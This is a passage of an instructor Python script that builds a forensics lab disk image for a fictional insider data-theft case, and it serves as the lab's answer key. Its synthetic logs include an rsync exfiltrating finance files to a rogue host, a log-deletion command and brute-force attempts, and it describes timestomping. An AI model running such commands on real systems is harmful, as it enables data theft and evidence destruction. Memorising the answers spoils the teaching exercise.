#!/usr/bin/env python3

"""
CYBR 2800 Digital Forensics
Instructor Evidence Image Generator -- Lab 3 of 3

Creates:
    CYBR2800_Lab3_Evidence.dd
    CYBR2800_Lab3_Evidence.dd.sha256
    CYBR2800_Lab3_Evidence_manifest.txt

------------------------------------------------------------------
CASE CYBR-2026-0042 -- "THE TOBOR TRANSFER"
------------------------------------------------------------------

This is the capstone image. It is a direct continuation of the Lab 1
and Lab 2 evidence sets and deliberately resolves the ambiguity those
labs left open.

Lab 1 gave students Alex's workstation (10.10.20.10).
Lab 2 added backupadmin's backup drive (backup01, 10.10.20.25) and
surfaced three things students could not explain:

    - repeated SSH brute-force attempts from an unattributed host,
      10.10.20.55
    - a backup job on 2026-08-19 that failed with an authentication
      error
    - a backup job on 2026-08-20 that ran outside the maintenance
      window using backupadmin's credentials

Lab 3 adds a third evidence source: a full forensic image of Alex's
workstation taken on 2026-08-24, after Legal and the DLP team opened a
financial-data investigation. It contains:

    - ~6 months of finance reporting API access logs showing Alex
      enumerating and then systematically harvesting financial reports
    - real .xlsx workbooks (bank reconciliations, a wire-transfer
      ledger, client bank account master data, payroll disbursements)
      containing tens of thousands of transaction rows
    - a hidden staging directory, deleted, containing those workbooks
      plus a packed export archive and a transfer manifest
    - rsync/scp transfers to "tobor.rm", an unmanaged personal laptop
      Alex attached to the corporate network
    - WhatsApp, Telegram, and Signal conversation histories, including
      one deleted thread negotiating the handoff
    - a DHCP server log proving 10.10.20.55 and 10.10.20.77 were two
      leases issued to the SAME MAC address (b4:2e:99:0c:17:aa,
      hostname TOBOR-RM)

That last item is the payoff. The unattributed brute-force source from
Lab 2 is Alex's own laptop. No single artifact says so -- students have
to correlate the DHCP log against the network log, the SSH known_hosts
file, and the workstation's hosts file to get there.

------------------------------------------------------------------
TWO DELIBERATE DESIGN DECISIONS
------------------------------------------------------------------

1.  Evidence is deleted OFFLINE with debugfs, not through the mount.

    When the Linux kernel frees a file -- on ext2 and ext4 alike -- it
    zeroes the inode's size and block pointers and stamps mtime/ctime
    with the current clock. `fls -r -d` still lists the filename, but
    `istat` reports size 0, `icat` returns zero bytes, and the recovery
    half of the lab is unearnable. This was tested on Ubuntu 24.04:
    simply running unlink() on a mounted ext2 filesystem does NOT work.

    debugfs deletes at the filesystem level instead. It frees the inode
    and its blocks and records a dtime, but leaves size, block pointers,
    and the scenario mtime in place -- which is what a genuinely
    deleted, not-yet-overwritten file looks like to The Sleuth Kit.
    That includes the multi-block binary files (.xlsx, .tar.gz) and a
    deleted directory this lab depends on.

    ext2 is used only because it is simple and has no journal; ext4
    would also work with this method. See INSTRUCTOR_GUIDE.md 3.3.

2.  Filesystem timestamps are set to match the scenario.

    A timeline lab whose MAC times all read "the day the instructor
    built the image" teaches nothing. After the tree is populated, an
    os.utime() pass rewrites atime and mtime to the narrative dates so
    `fls -m` and `mactime` produce a timeline that matches the logs.

    ctime and the deletion time (dtime) still reflect build time, and
    that is intentional: it is the concrete example students use in the
    handout section on why you never trust a single timestamp. One file
    is also deliberately timestomped. (ext2 has no creation/birth time
    at all, so there is no crtime to worry about.)

IMPORTANT:
This script is for the instructor. Run it inside the Ubuntu VM as root.
Students receive only a copy of the .dd image and its SHA-256 value --
never this script and never the generated manifest, both of which are
effectively answer keys.
"""

import io
import os
import random
import shutil
import subprocess
import sys
import tarfile
import zipfile
from datetime import date, datetime, timedelta, timezone
from pathlib import Path


# ============================================================
# CONFIGURATION
# ============================================================

IMAGE_NAME = "CYBR2800_Lab3_Evidence.dd"
IMAGE_SIZE_MB = 512
PARTITION_START = "1MiB"
FS_LABEL = "CYBR2800L3"

# ext2, not ext4 -- see the module docstring. Changing this back to
# ext4 silently breaks every `icat` recovery step in the handout.
FS_TYPE = "ext2"

MOUNT_POINT = Path("/mnt/cybr2800_lab3_evidence")
BUILD_DIR = Path("/tmp/cybr2800_lab3_evidence_build")
EVIDENCE_ROOT = BUILD_DIR / "root"

SCRIPT_DIR = Path.cwd()

IMAGE_PATH = SCRIPT_DIR / IMAGE_NAME
HASH_PATH = SCRIPT_DIR / f"{IMAGE_NAME}.sha256"
MANIFEST_PATH = SCRIPT_DIR / "CYBR2800_Lab3_Evidence_manifest.txt"

# Fixed seed so two builds produce identical *content*. The image hash
# will still differ between builds because mkfs generates a new
# filesystem UUID each time -- build once per semester.
RNG = random.Random(20260820)


# ------------------------------------------------------------
# Scenario constants
#
# Every IP, account, and hostname used anywhere in this file comes
# from here. The student handout (lab04.html) hard-codes these same
# values, so changing one means changing both.
# ------------------------------------------------------------

HOST_WORKSTATION = "10.10.20.10"     # Alex's issued workstation (imaged)
HOST_APP01 = "10.10.20.15"           # internal app server   (from Lab 2)
HOST_BACKUP01 = "10.10.20.25"        # backup server         (from Lab 2)
HOST_DB01 = "10.10.20.30"            # database server       (from Lab 2)
HOST_VPN01 = "10.10.20.5"            # VPN concentrator
HOST_FIN_APP = "10.10.20.40"         # finance reporting application
HOST_FIN_DB = "10.10.20.41"          # finance database
HOST_FILESHARE = "10.10.20.45"       # file server hosting the finance share

# The pivot. Two leases, one MAC, one laptop.
TOBOR_LEASE_OLD = "10.10.20.55"      # the unattributed host from Lab 2
TOBOR_LEASE_NEW = "10.10.20.77"
TOBOR_MAC = "b4:2e:99:0c:17:aa"
TOBOR_NETBIOS = "TOBOR-RM"
TOBOR_FQDN = "tobor.rm"
TOBOR_HOSTKEY = "SHA256:qJ7kP2mX9vR4tN8wL1cF6yB3dH5aZ0sEgU2iO7nM4xQ"

# The lease flips mid-afternoon on the incident day, AFTER the
# morning brute-force attempts Lab 2 recorded from 10.10.20.55 and
# BEFORE the afternoon exfiltration from 10.10.20.77.
LEASE_FLIP_TIME = "2026-08-20 13:12:48"

USER_SUBJECT = "alex"
USER_BACKUP = "backupadmin"          # service account       (from Lab 2)
USER_NOISE = "jordan"                # noise account         (from Lab 2)
USER_ANALYST = "priya"               # legitimate finance analyst (control)
USER_SERVICE = "svc_report"          # scheduled reporting service account

CASE_NUMBER = "CYBR-2026-0042"
INCIDENT_DAY = date(2026, 8, 20)
ACQUISITION_DAY = date(2026, 8, 24)

# Daily backup job logs carried forward from the Lab 2 backup drive.
BACKUP_LOG_START = date(2026, 2, 1)
BACKUP_LOG_END = date(2026, 8, 20)

# Everything that does not get an explicit timestamp lands here.
DEFAULT_SCENARIO_TIME = "2026-08-14 09:12:00"

# Populated by apply_* helpers; consumed by apply_timestamps().
# Maps a path relative to the filesystem root -> (atime, mtime).
TIMESTAMPS = {}

# Populated by the workbook builders; consumed by the staged-export
# manifest and the instructor manifest so the "how much was exposed"
# question has exactly one correct answer.
WORKBOOK_STATS = {}

# Tracks the loop device currently attached to IMAGE_PATH.
CURRENT_LOOP_DEV = None


# ============================================================
# HELPER FUNCTIONS
# ============================================================

def run(command, check=True):
    """Run a system command and display it."""

    print()
    print("[+] " + " ".join(str(x) for x in command))

    return subprocess.run(command, check=check, text=True)


def run_output(command):
    """Run a system command and capture its output."""

    print()
    print("[+] " + " ".join(str(x) for x in command))

    return subprocess.check_output(command, text=True).strip()


def write_file(path, content):
    """Create a text file."""

    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def write_bytes(path, data):
    """Create a binary file."""

    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)


def stamp(relative_path, accessed, modified=None):
    """
    Register scenario timestamps for a path relative to the filesystem
    root. Times are "YYYY-MM-DD HH:MM:SS", interpreted as UTC.
    """

    TIMESTAMPS[relative_path] = (accessed, modified or accessed)


def to_epoch(value):
    """Convert 'YYYY-MM-DD HH:MM:SS' into a UTC epoch value."""

    parsed = datetime.strptime(value, "%Y-%m-%d %H:%M:%S")

    return parsed.replace(tzinfo=timezone.utc).timestamp()


def require_root():
    """Require root privileges."""

    if os.geteuid() != 0:
        print()
        print("[-] This script must be run as root.")
        print()
        print("Run:")
        print()
        print("    sudo python3 cybr2800_forensic_evidence_lab4.py")
        print()
        sys.exit(1)


def check_tools():
    """Check required Linux tools."""

    required_tools = [
        "dd",
        "parted",
        "losetup",
        f"mkfs.{FS_TYPE}",
        "mount",
        "umount",
        "mountpoint",
        "sha256sum",
        "cp",
        "rm",
        "sync",
        "chmod",
        "debugfs",
    ]

    missing = [tool for tool in required_tools if shutil.which(tool) is None]

    if missing:
        print()
        print("[-] Missing required tools:")

        for tool in missing:
            print(f"    {tool}")

        print()
        print("Install the required packages before running the script:")
        print()
        print("    sudo apt install e2fsprogs coreutils parted util-linux")
        print()
        sys.exit(1)


def detach_loop_device():
    """Detach the loop device attached to the image, if any."""

    global CURRENT_LOOP_DEV

    if CURRENT_LOOP_DEV:
        print(f"[+] Detaching loop device: {CURRENT_LOOP_DEV}")
        subprocess.run(["losetup", "-d", CURRENT_LOOP_DEV], check=False)
        CURRENT_LOOP_DEV = None


def detach_stray_loop_devices():
    """Detach loop devices left over from a previous interrupted run."""

    if not IMAGE_PATH.exists():
        return

    result = subprocess.run(
        ["losetup", "-j", str(IMAGE_PATH)],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
        check=False,
    )

    for line in result.stdout.splitlines():
        loop_dev = line.split(":")[0].strip()

        if loop_dev:
            print(f"[+] Detaching stray loop device: {loop_dev}")
            subprocess.run(["losetup", "-d", loop_dev], check=False)


def cleanup_mount():
    """Unmount the evidence image and detach its loop device."""

    result = subprocess.run(
        ["mountpoint", "-q", str(MOUNT_POINT)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    if result.returncode == 0:
        print("[+] Unmounting existing mount...")
        subprocess.run(["umount", str(MOUNT_POINT)], check=False)

    detach_loop_device()


def cleanup():
    """Clean temporary resources."""

    cleanup_mount()
    detach_stray_loop_devices()

    if BUILD_DIR.exists():
        shutil.rmtree(BUILD_DIR)

    MOUNT_POINT.mkdir(parents=True, exist_ok=True)


# ============================================================
# MINIMAL XLSX WRITER
# ============================================================
#
# Students must recover real spreadsheets, not text files renamed to
# .xlsx. A fake file would fall apart the moment anyone ran `file` on
# it or tried to open it, and the whole point of the exercise is that
# the recovered workbooks open and can be totalled.
#
# We write the minimum valid SpreadsheetML package by hand with the
# standard library so the script has no pip dependencies:
#
#     [Content_Types].xml
#     _rels/.rels
#     xl/workbook.xml
#     xl/_rels/workbook.xml.rels
#     xl/worksheets/sheet1.xml
#
# Strings are written inline (t="inlineStr") rather than through a
# shared string table, which keeps the writer simple at the cost of a
# slightly larger part.
#
# Note for the handout: because the package is DEFLATE-compressed,
# `grep` and `strings` find nothing useful inside a recovered .xlsx.
# That is a feature -- it is what forces students to actually unzip it.

XLSX_CONTENT_TYPES = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" '
    'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/xl/workbook.xml" '
    'ContentType="application/vnd.openxmlformats-officedocument.'
    'spreadsheetml.sheet.main+xml"/>'
    '<Override PartName="/xl/worksheets/sheet1.xml" '
    'ContentType="application/vnd.openxmlformats-officedocument.'
    'spreadsheetml.worksheet+xml"/>'
    "</Types>"
)

XLSX_ROOT_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
    'officeDocument" Target="xl/workbook.xml"/>'
    "</Relationships>"
)

XLSX_WORKBOOK_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
    'worksheet" Target="worksheets/sheet1.xml"/>'
    "</Relationships>"
)


def xml_escape(value):
    """Escape a value for inclusion in XML character data."""

    return (
        str(value)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
    )


def column_letter(index):
    """Convert a zero-based column index into a spreadsheet letter."""

    letters = ""

    index += 1

    while index:
        index, remainder = divmod(index - 1, 26)
        letters = chr(65 + remainder) + letters

    return letters


def build_xlsx(sheet_name, headers, rows):
    """
    Build a valid .xlsx package in memory and return it as bytes.

    headers -- list of column headings
    rows    -- list of lists; int/float become numeric cells, anything
               else becomes an inline string
    """

    sheet = io.StringIO()

    sheet.write('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>')
    sheet.write(
        '<worksheet xmlns="http://schemas.openxmlformats.org/'
        'spreadsheetml/2006/main"><sheetData>'
    )

    def write_row(row_number, values):
        sheet.write(f'<row r="{row_number}">')

        for column_index, value in enumerate(values):
            reference = f"{column_letter(column_index)}{row_number}"

            if isinstance(value, bool) or value is None:
                continue

            if isinstance(value, (int, float)):
                sheet.write(f'<c r="{reference}"><v>{value}</v></c>')
            else:
                sheet.write(
                    f'<c r="{reference}" t="inlineStr"><is><t>'
                    f"{xml_escape(value)}</t></is></c>"
                )

        sheet.write("</row>")

    write_row(1, headers)

    for offset, row in enumerate(rows):
        write_row(offset + 2, row)

    sheet.write("</sheetData></worksheet>")

    workbook = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<workbook xmlns="http://schemas.openxmlformats.org/'
        'spreadsheetml/2006/main" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships"><sheets>'
        f'<sheet name="{xml_escape(sheet_name)}" sheetId="1" r:id="rId1"/>'
        "</sheets></workbook>"
    )

    buffer = io.BytesIO()

    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", XLSX_CONTENT_TYPES)
        archive.writestr("_rels/.rels", XLSX_ROOT_RELS)
        archive.writestr("xl/workbook.xml", workbook)
        archive.writestr("xl/_rels/workbook.xml.rels", XLSX_WORKBOOK_RELS)
        archive.writestr("xl/worksheets/sheet1.xml", sheet.getvalue())

    return buffer.getvalue()


# ============================================================
# SYNTHETIC FINANCIAL DATA
# ============================================================

CLIENT_PREFIXES = [
    "Northline", "Cedar Ridge", "Harborpoint", "Vantage", "Keystone",
    "Brightwater", "Ironvale", "Summit Grove", "Redstone", "Lakefront",
    "Pinnacle", "Eastgate", "Silverbrook", "Granite Hill", "Westmoor",
    "Copperfield", "Fairhaven", "Stonebridge", "Clearview", "Oakmont",
]

CLIENT_SUFFIXES = [
    "Logistics", "Holdings", "Manufacturing", "Capital Partners",
    "Health Systems", "Agricultural Co-op", "Construction Group",
    "Media Group", "Energy", "Distribution",
]

BANK_NAMES = [
    "First Meridian Bank", "Cascade National", "Union Valley Trust",
    "Pioneer State Bank", "Summit Federal Credit Union",
]

TRANSACTION_KINDS = [
    "ACH Credit", "ACH Debit", "Wire Out", "Wire In", "Check Clearing",
    "Lockbox Deposit", "Card Settlement", "Payroll Run", "Tax Remittance",
    "Intercompany Transfer",
]

APPROVERS = [
    "p.raman", "d.oyelaran", "m.castellanos", "s.whitfield", "t.nakamura",
]


def build_client_list(count):
    """Build a deterministic list of (account_number, client_name)."""

    clients = []

    for index in range(count):
        prefix = CLIENT_PREFIXES[index % len(CLIENT_PREFIXES)]
        suffix = CLIENT_SUFFIXES[(index // len(CLIENT_PREFIXES)) % len(CLIENT_SUFFIXES)]

        clients.append(
            (
                f"ACCT-{4100000 + (index * 137):07d}",
                f"{prefix} {suffix}",
            )
        )

    return clients


CLIENTS = build_client_list(180)


def build_transaction_rows(row_count, start_day, end_day, kinds=None):
    """
    Generate transaction rows and return (rows, total_amount).

    Amounts are rounded to cents and the returned total is the exact
    sum, so the staged-export manifest and the recovered workbook
    agree to the penny. That is what makes "quantify the exposure" a
    gradeable question instead of a guess.
    """

    kinds = kinds or TRANSACTION_KINDS
    span = (end_day - start_day).days or 1

    rows = []
    total = 0.0

    for index in range(row_count):
        posted = start_day + timedelta(days=RNG.randrange(span))
        account_number, client_name = CLIENTS[RNG.randrange(len(CLIENTS))]

        amount = round(RNG.uniform(250.0, 486000.0), 2)
        total = round(total + amount, 2)

        rows.append(
            [
                posted.isoformat(),
                f"TXN-{2026000000 + index * 7 + 11:010d}",
                account_number,
                client_name,
                BANK_NAMES[index % len(BANK_NAMES)],
                f"{RNG.randrange(10**11, 10**12):012d}"[-4:].rjust(12, "*"),
                kinds[RNG.randrange(len(kinds))],
                "USD",
                amount,
                "POSTED" if index % 23 else "PENDING REVIEW",
                APPROVERS[index % len(APPROVERS)],
            ]
        )

    return rows, total


TRANSACTION_HEADERS = [
    "Posting Date",
    "Transaction ID",
    "Client Account",
    "Client Name",
    "Banking Partner",
    "Bank Account (Masked)",
    "Transaction Type",
    "Currency",
    "Amount (USD)",
    "Status",
    "Approver",
]


def make_financial_workbook(key, sheet_name, row_count, start_day, end_day, kinds=None):
    """
    Build one financial workbook, record its statistics, and return
    its bytes.
    """

    rows, total = build_transaction_rows(row_count, start_day, end_day, kinds)

    rows.append(
        [
            "",
            "",
            "",
            "",
            "",
            "",
            "GRAND TOTAL",
            "USD",
            round(total, 2),
            "",
            "",
        ]
    )

    payload = build_xlsx(sheet_name, TRANSACTION_HEADERS, rows)

    WORKBOOK_STATS[key] = {
        "rows": row_count,
        "total": round(total, 2),
        "bytes": len(payload),
    }

    return payload


def rows_to_csv(headers, rows):
    """Render rows as CSV text (no csv module quoting needed here)."""

    lines = [",".join(headers)]

    for row in rows:
        lines.append(
            ",".join(
                f'"{cell}"' if isinstance(cell, str) and "," in cell else str(cell)
                for cell in row
            )
        )

    return "\n".join(lines) + "\n"


# ============================================================
# LOG BUILDERS -- SYSTEM AND CONTINUITY
# ============================================================

def build_auth_log():
    """
    Multi-month auth.log.

    The 2026-08-20 block is preserved verbatim from the Lab 2 evidence
    set so students who kept their Lab 2 notes can line the two images
    up directly. Everything else is new context around it.
    """

    lines = []
    pid = 1000

    for day_offset in range(0, 170):
        day = date(2026, 3, 1) + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        pid += 4
        prefix = day.strftime("%b %d")

        lines.append(
            f"{prefix} 08:0{day_offset % 6}:11 workstation sshd[{pid}]: "
            f"Accepted password for {USER_SUBJECT} from {HOST_WORKSTATION} port 52{day_offset % 900:03d} ssh2"
        )
        lines.append(
            f"{prefix} 02:00:0{day_offset % 6} workstation sshd[{pid + 1}]: "
            f"Accepted publickey for {USER_BACKUP} from {HOST_BACKUP01} port 41{day_offset % 900:03d} ssh2"
        )

        if day_offset % 3 == 0:
            lines.append(
                f"{prefix} 09:4{day_offset % 6}:02 workstation sshd[{pid + 2}]: "
                f"Accepted password for {USER_ANALYST} from {HOST_WORKSTATION} port 55{day_offset % 900:03d} ssh2"
            )

        # Alex starts authenticating to the finance app in June and the
        # frequency climbs from there.
        if day >= date(2026, 6, 1) and day_offset % 2 == 0:
            lines.append(
                f"{prefix} 19:1{day_offset % 6}:33 workstation sudo: "
                f"{USER_SUBJECT} : TTY=pts/1 ; PWD=/home/{USER_SUBJECT} ; USER=root ; "
                f"COMMAND=/usr/bin/mount -t cifs //{HOST_FILESHARE}/finance /mnt/finance_share"
            )

        lines.append(
            f"{prefix} 17:4{day_offset % 6}:22 workstation sshd[{pid + 3}]: "
            f"pam_unix(sshd:session): session closed for user {USER_SUBJECT}"
        )

    # ---- Incident day. Lab 2 lines preserved exactly. ----
    lines += [
        "Aug 20 08:01:11 workstation sshd[1201]: "
        f"Accepted password for alex from {HOST_WORKSTATION}",
        "Aug 20 08:02:43 workstation sshd[1210]: "
        f"Failed password for root from {TOBOR_LEASE_OLD}",
        "Aug 20 08:02:47 workstation sshd[1211]: "
        f"Failed password for root from {TOBOR_LEASE_OLD}",
        "Aug 20 08:03:02 workstation sshd[1212]: "
        f"Failed password for admin from {TOBOR_LEASE_OLD}",
        "Aug 20 09:15:31 workstation sudo: alex : COMMAND=/usr/bin/ls",
        "Aug 20 10:21:43 workstation sshd[1401]: "
        f"Accepted password for alex from {HOST_APP01}",
        "Aug 20 14:20:10 workstation sshd[1901]: "
        f"Accepted password for backupadmin from {HOST_BACKUP01}",
        "Aug 20 14:22:17 workstation sshd[1902]: "
        "session opened for user backupadmin",
        "Aug 20 14:31:44 workstation sshd[1902]: "
        "session closed for user backupadmin",
        "Aug 20 15:42:03 workstation sshd[2010]: "
        f"Failed password for root from {TOBOR_LEASE_OLD}",
        "Aug 20 15:42:06 workstation sshd[2011]: "
        f"Failed password for root from {TOBOR_LEASE_OLD}",
    ]

    # ---- New Lab 3 incident-day detail ----
    lines += [
        "Aug 20 13:12:51 workstation systemd-networkd[612]: "
        f"neighbour {TOBOR_LEASE_NEW} lladdr {TOBOR_MAC} reachable",
        "Aug 20 14:44:09 workstation sudo: "
        f"{USER_SUBJECT} : TTY=pts/1 ; PWD=/home/{USER_SUBJECT}/Downloads ; "
        "USER=root ; COMMAND=/usr/bin/tar -czf "
        "/home/alex/Downloads/.cache_sync/finance_packet_2026-08-20.tar.gz .",
        "Aug 20 14:58:12 workstation sshd[2130]: "
        f"Accepted publickey for {USER_SUBJECT} from {HOST_WORKSTATION} "
        f"port 49210 ssh2: ED25519 {TOBOR_HOSTKEY}",
        "Aug 20 15:03:55 workstation sudo: "
        f"{USER_SUBJECT} : TTY=pts/1 ; PWD=/home/{USER_SUBJECT} ; USER=root ; "
        "COMMAND=/usr/bin/rsync -az --remove-source-files "
        f"/home/alex/Downloads/.cache_sync/ {USER_SUBJECT}@{TOBOR_FQDN}:/data/incoming/",
        "Aug 20 15:49:31 workstation sudo: "
        f"{USER_SUBJECT} : TTY=pts/1 ; PWD=/var/log ; USER=root ; "
        "COMMAND=/usr/bin/rm -f /var/log/finance_api/access.log.1",
        "Aug 20 15:51:02 workstation sshd[2201]: "
        f"pam_unix(sshd:session): session closed for user {USER_SUBJECT}",
    ]

    # ---- Days between the incident and acquisition ----
    for day_offset in range(1, 5):
        day = INCIDENT_DAY + timedelta(days=day_offset)
        prefix = day.strftime("%b %d")
        pid += 5

        lines.append(
            f"{prefix} 08:0{day_offset}:11 workstation sshd[{pid}]: "
            f"Accepted password for {USER_SUBJECT} from {HOST_WORKSTATION}"
        )
        lines.append(
            f"{prefix} 17:4{day_offset}:00 workstation sshd[{pid + 1}]: "
            f"pam_unix(sshd:session): session closed for user {USER_SUBJECT}"
        )

    return "\n".join(lines) + "\n"


def build_syslog():
    """Multi-month syslog, including the mount of the finance share."""

    lines = []

    for day_offset in range(0, 170):
        day = date(2026, 3, 1) + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        prefix = day.strftime("%b %d")

        lines.append(
            f"{prefix} 06:00:0{day_offset % 6} workstation systemd[1]: "
            "Starting Daily apt download activities..."
        )
        lines.append(
            f"{prefix} 08:0{day_offset % 6}:00 workstation systemd[1]: "
            "Started User Manager for UID 1000."
        )
        lines.append(
            f"{prefix} 02:00:0{day_offset % 6} workstation cron[{2000 + day_offset}]: "
            f"({USER_BACKUP}) CMD (/usr/local/bin/backup_rotate.sh)"
        )

        if day >= date(2026, 6, 1) and day_offset % 2 == 0:
            lines.append(
                f"{prefix} 19:1{day_offset % 6}:34 workstation kernel: "
                f"CIFS: Attempting to mount //{HOST_FILESHARE}/finance"
            )

    lines += [
        "Aug 20 08:00:00 workstation systemd[1]: Started Network Service.",
        "Aug 20 08:05:13 workstation systemd[1]: Started User Manager for UID 1000.",
        "Aug 20 09:12:55 workstation kernel: eth0: link becomes ready",
        "Aug 20 10:22:10 workstation systemd[1]: Started OpenSSH server.",
        f"Aug 20 13:12:48 workstation dhclient[744]: bound to {TOBOR_LEASE_NEW} "
        "-- renewal in 1800 seconds. (peer lease observed on bridge br0)",
        f"Aug 20 13:12:52 workstation kernel: br0: received packet on eth0 with "
        f"own address as source address (addr:{TOBOR_MAC}, vlan:0)",
        "Aug 20 14:19:57 workstation systemd[1]: Accepted SSH connection.",
        "Aug 20 14:20:01 workstation systemd[1]: New session created.",
        "Aug 20 14:32:01 workstation systemd[1]: Session closed.",
        "Aug 20 14:44:11 workstation kernel: "
        "EXT4-fs (sda1): write throughput elevated (tar)",
        "Aug 20 15:03:58 workstation systemd[1]: Started rsync transfer session.",
        "Aug 20 15:47:22 workstation systemd[1]: rsync transfer session completed.",
        "Aug 20 15:49:33 workstation rsyslogd: "
        "file '/var/log/finance_api/access.log.1' removed by external process",
        "Aug 20 15:52:40 workstation systemd[1]: Stopped User Manager for UID 1000.",
    ]

    for day_offset in range(1, 5):
        day = INCIDENT_DAY + timedelta(days=day_offset)
        prefix = day.strftime("%b %d")

        lines.append(
            f"{prefix} 08:0{day_offset}:00 workstation systemd[1]: "
            "Started User Manager for UID 1000."
        )

    lines.append(
        f"{ACQUISITION_DAY.strftime('%b %d')} 07:02:14 workstation systemd[1]: "
        "System powered down for forensic acquisition."
    )

    return "\n".join(lines) + "\n"


def build_dhcpd_log():
    """
    The attribution artifact.

    This is the single most important new log in the image, and the
    handout never names it -- students are asked to attribute
    10.10.20.55 and must find this themselves.

    It shows one MAC address (TOBOR_MAC, hostname TOBOR-RM) holding
    10.10.20.55 from February until the afternoon of the incident day,
    then being re-leased 10.10.20.77. Both of those addresses appear
    elsewhere in the evidence as if they were unrelated hosts.

    Plenty of ordinary lease traffic surrounds it so the pivot is not
    the only thing in the file.
    """

    managed_hosts = [
        ("00:1b:44:11:3a:b7", "WKS-ALEX", HOST_WORKSTATION),
        ("00:1b:44:11:3a:c2", "WKS-PRIYA", "10.10.20.11"),
        ("00:1b:44:11:3a:d9", "WKS-JORDAN", "10.10.20.12"),
        ("52:54:00:9a:1f:0e", "APP01", HOST_APP01),
        ("52:54:00:9a:1f:22", "BACKUP01", HOST_BACKUP01),
        ("52:54:00:9a:1f:35", "DB01", HOST_DB01),
        ("52:54:00:9a:1f:41", "FIN-APP01", HOST_FIN_APP),
        ("52:54:00:9a:1f:52", "FIN-DB01", HOST_FIN_DB),
        ("52:54:00:9a:1f:63", "FILESHARE01", HOST_FILESHARE),
    ]

    lines = [
        "# dhcpd lease activity log -- vlan20 (corporate workstations)",
        "# Managed assets are reserved; unreserved MACs receive dynamic",
        "# leases from the 10.10.20.50-10.10.20.99 pool.",
        "",
    ]

    first_seen = date(2026, 2, 3)

    lines.append(
        f"{first_seen.isoformat()} 08:12:44 DHCPDISCOVER from {TOBOR_MAC} via eth0"
    )
    lines.append(
        f"{first_seen.isoformat()} 08:12:45 DHCPOFFER on {TOBOR_LEASE_OLD} "
        f"to {TOBOR_MAC} ({TOBOR_NETBIOS}) via eth0"
    )
    lines.append(
        f"{first_seen.isoformat()} 08:12:45 DHCPACK on {TOBOR_LEASE_OLD} "
        f"to {TOBOR_MAC} ({TOBOR_NETBIOS}) via eth0"
    )
    lines.append(
        f"{first_seen.isoformat()} 08:12:46 WARNING unreserved MAC {TOBOR_MAC} "
        f"on corporate vlan20 -- hostname {TOBOR_NETBIOS} not in asset inventory"
    )

    for day_offset in range(0, 200):
        day = first_seen + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        for mac, name, address in managed_hosts:
            if (day_offset + len(name)) % 7:
                continue

            lines.append(
                f"{day.isoformat()} 0{(day_offset % 5) + 4}:0{day_offset % 6}:1"
                f"{day_offset % 9} DHCPACK on {address} to {mac} ({name}) via eth0"
            )

        # TOBOR-RM renews whenever Alex brings the laptop in.
        if day_offset % 3 == 0 and day < INCIDENT_DAY:
            lines.append(
                f"{day.isoformat()} 08:1{day_offset % 6}:07 DHCPREQUEST for "
                f"{TOBOR_LEASE_OLD} from {TOBOR_MAC} ({TOBOR_NETBIOS}) via eth0"
            )
            lines.append(
                f"{day.isoformat()} 08:1{day_offset % 6}:07 DHCPACK on "
                f"{TOBOR_LEASE_OLD} to {TOBOR_MAC} ({TOBOR_NETBIOS}) via eth0"
            )

    # ---- The flip ----
    lines += [
        f"{INCIDENT_DAY.isoformat()} 07:58:02 DHCPREQUEST for {TOBOR_LEASE_OLD} "
        f"from {TOBOR_MAC} ({TOBOR_NETBIOS}) via eth0",
        f"{INCIDENT_DAY.isoformat()} 07:58:02 DHCPACK on {TOBOR_LEASE_OLD} "
        f"to {TOBOR_MAC} ({TOBOR_NETBIOS}) via eth0",
        f"{INCIDENT_DAY.isoformat()} 12:58:31 DHCPRELEASE of {TOBOR_LEASE_OLD} "
        f"from {TOBOR_MAC} ({TOBOR_NETBIOS}) via eth0 (found)",
        f"{INCIDENT_DAY.isoformat()} 13:12:44 DHCPDISCOVER from {TOBOR_MAC} via eth0",
        f"{INCIDENT_DAY.isoformat()} 13:12:46 DHCPOFFER on {TOBOR_LEASE_NEW} "
        f"to {TOBOR_MAC} ({TOBOR_NETBIOS}) via eth0",
        f"{INCIDENT_DAY.isoformat()} {LEASE_FLIP_TIME.split()[1]} DHCPACK on "
        f"{TOBOR_LEASE_NEW} to {TOBOR_MAC} ({TOBOR_NETBIOS}) via eth0",
        f"{INCIDENT_DAY.isoformat()} 13:12:49 WARNING unreserved MAC {TOBOR_MAC} "
        f"on corporate vlan20 -- hostname {TOBOR_NETBIOS} not in asset inventory",
        f"{INCIDENT_DAY.isoformat()} 13:12:50 INFO lease history for {TOBOR_MAC}: "
        f"{TOBOR_LEASE_OLD} (2026-02-03 to 2026-08-20), "
        f"{TOBOR_LEASE_NEW} (2026-08-20 to present)",
        f"{INCIDENT_DAY.isoformat()} 16:04:18 DHCPRELEASE of {TOBOR_LEASE_NEW} "
        f"from {TOBOR_MAC} ({TOBOR_NETBIOS}) via eth0 (found)",
    ]

    return "\n".join(lines) + "\n"


def build_vpn_log():
    """VPN concentrator log -- after-hours sessions by the subject."""

    lines = [
